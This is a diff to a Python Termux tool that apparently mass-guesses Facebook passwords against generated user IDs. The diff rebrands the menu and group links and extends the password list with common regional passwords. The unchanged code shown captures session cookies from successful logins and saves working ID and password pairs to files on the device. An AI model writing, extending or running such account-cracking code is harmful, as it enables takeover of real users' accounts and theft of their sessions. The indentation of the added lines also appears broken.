@@ -590,20 +590,20 @@ def main():
     print('\033[1;32m--------------------------------------------------------------') 
     print(f"\033[1;97m[+] \033[1;92mNAME \033[1;91m: \033[1;96m{NameX}")
     print('\033[1;32m--------------------------------------------------------------') 
-    print(f"\033[1;97m[01] \033[1;92mSTART CLONING")
-    print(f"\033[1;97m[02] \033[1;92mJOIN TO BEST TECHNICAL TELEGRAM")
-    print(f"\033[1;97m[03] \033[1;92mJOIN TO AWM PROGRAMING TELEGRAM")
-    print(f"\033[1;97m[00] \033[1;92mEXIT ")
-    print('\033[1;32m--------------------------------------------------------------') 
-    mirwais = input("\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SELECT \033[1;37m: \033[1;36m")
-    if mirwais in ["1","01"]:
-        passx()
-    elif mirwais in ["2","02"]:
-        os.system("xdg-open https://t.me/best_technicals")
-        main()
-    elif mirwais in ["3","03"]:
-        os.system("xdg-open https://t.me/AWM_PROGRAMING")
-        main()
+     print(f"\033[1;97m[01] \033[1;92mSTART CLONING") 
+     print(f"\033[1;97m[02] \033[1;92MJOIN TO AFG Termux command FB group") 
+     print(f"\033[1;97m[03] \033[1;92mJOIN TO AFG TERMUX COMMAND TELEGRAM") 
+     print(f"\033[1;97m[00] \033[1;92mEXIT ") 
+     print('\033[1;32m--------------------------------------------------------------')  
+     mirwais = input("\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SELECT \033[1;37m: \033[1;36m") 
+     if mirwais in ["1","01"]: 
+         passx() 
+     elif mirwais in ["2","02"]: 
+         os.system("xdg-open https://www.facebook.com/groups/3508391782738119") 
+         main() 
+     elif mirwais in ["3","03"]: 
+         os.system("xdg-open https://t.me/AFGTERMUXKEFAYAT") 
+         main() 
     elif mirwais in ["0","00"]:
        exit()
     else:
@@ -740,9 +740,9 @@ def awm1():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'afghan12345', 'afghan1234']
+                 for love in user: 
+             uid = code+love 
+             pwx = [love,'afghan12345', 'afghan1234', 'KHAN1122', 'KHAN KHAN', 'PAKISTAN', 'KHAN123', 'KHAN1234', 'KHANKHAN', 'AFGHANISTAN', '500600', 'KHAN786', '786786', '1122334455', 'AFGHAN123', '1234512345', 'KABUL1234', '100200', 'AFGHAN', 'AFGHAN1234', 'KABUL123', 'password']
             manshera.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
@@ -1905,21 +1905,21 @@ def freeq(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[151:166]
-                print(f'\r\33[1;97m[\033[1;96mB-T-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+  ' \n \0333Cookie = \033[1;91m'+coki+ ' \n '+pro+' \033[0;97m')
+                print(f'\r\33[1;97m[\033[1;96mKefayat-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+  ' \n \0333Cookie = \033[1;91m'+coki+ ' \n '+pro+' \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[141:156]
-                    print(f'\r\33[1;97m[\033[1;90mCheckpoint-B-T\033[1;97m]\033[1;93m '+uid+' | '+ps+' ')
+                    print(f'\r\33[1;97m[\033[1;90mCheckpoint-Kefayat\033[1;97m]\033[1;93m '+uid+' | '+ps+' ')
                     open('/sdcard/CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;35m[AWM+B-T] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;35m[Kefayat] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
     except:
         pass 
